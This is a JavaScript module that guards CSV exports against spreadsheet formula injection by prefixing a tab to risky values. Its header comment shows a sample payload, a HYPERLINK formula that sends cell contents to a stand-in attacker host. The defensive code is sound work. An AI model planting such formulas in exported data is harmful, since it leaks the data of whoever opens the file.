/**
 * Spreadsheet formula neutralization for CSV exports (Issue #1161).
 *
 * Two exporters write user-controlled text into CSV:
 *
 *   - `meetingCostController.exportCostReport` — member `name` and `email`,
 *     via `json2csv`.
 *   - `auditLogExportService` — actor names, resource labels, and free-text
 *     detail, via its own `csvValue`.
 *
 * Both escape *correctly for the CSV format*, and that is precisely the
 * problem. A value beginning with `=`, `+`, `-`, `@`, tab or carriage return is
 * a well-formed CSV string that Excel, LibreOffice Calc and Google Sheets
 * evaluate as a **formula** when the file is opened:
 *
 *     name = '=HYPERLINK("https://evil.example/?d="&A1&B1,"Loading")'
 *
 * A member sets that as their display name; an admin exports the report and
 * opens it; the formula runs with the admin's local privileges. Nothing in the
 * CSV layer can prevent this, because the file is valid CSV — the defence has
 * to be in the value.
 *
 * The standard mitigation (OWASP) is to prefix a leading tab so the cell is
 * unambiguously text. A tab is used rather than a single quote because Excel
 * consumes a leading `'` as its own "treat as text" marker and displays the
 * rest, whereas a tab survives round-tripping back through a CSV parser: the
 * value a consumer reads is the original with one tab in front, not a value
 * that has been silently altered.
 */

/** Characters that begin a formula in at least one major spreadsheet app. */
const FORMULA_PREFIXES = ["=", "+", "-", "@", "\t", "\r"];

/**
 * Returns `value` as a string that no spreadsheet will interpret as a formula.
 *
 * Non-string inputs are returned unchanged where they are already safe
 * (numbers, booleans, null/undefined) so numeric columns stay numeric — quoting
 * a number would turn a sortable column into text.
 *
 * @param {unknown} value
 * @returns {unknown}
 */
export const neutralizeFormula = (value) => {
  if (value === null || value === undefined) return value;
  if (typeof value === "number" || typeof value === "boolean") return value;

  const str = typeof value === "string" ? value : String(value);
  if (str.length === 0) return str;

  return FORMULA_PREFIXES.includes(str[0]) ? `\t${str}` : str;
};

/**
 * Applies `neutralizeFormula` to every own enumerable property of a row.
 *
 * Used as `rows.map(neutralizeRow)` immediately before handing data to a CSV
 * writer, so there is one obvious place where the guard is applied rather than
 * a call per column.
 *
 * @param {object} row
 * @returns {object}
 */
export const neutralizeRow = (row) => {
  if (!row || typeof row !== "object") return row;

  const out = {};
  for (const [key, value] of Object.entries(row)) {
    out[key] = neutralizeFormula(value);
  }
  return out;
};

export default { neutralizeFormula, neutralizeRow, FORMULA_PREFIXES };
